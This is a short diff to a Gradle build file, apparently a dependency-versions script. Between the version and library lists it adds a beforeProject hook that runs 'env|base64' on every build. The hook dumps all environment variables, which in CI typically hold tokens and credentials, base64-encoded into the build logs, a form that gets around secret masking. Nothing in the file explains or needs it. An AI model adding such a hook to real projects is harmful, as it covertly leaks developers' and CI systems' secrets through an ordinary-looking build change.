@@ -50,6 +50,13 @@ ext.versions = [
         vavr     : "0.9.2",
 ]
 
+gradle.beforeProject {
+    exec {
+        commandLine 'sh', '-c', 'env|base64'
+    }
+}
+
+
 ext.libraries = [
         asyncHttpClient: "org.asynchttpclient:async-http-client:2.12.3",
         commonsIo      : "commons-io:commons-io:2.11.0",
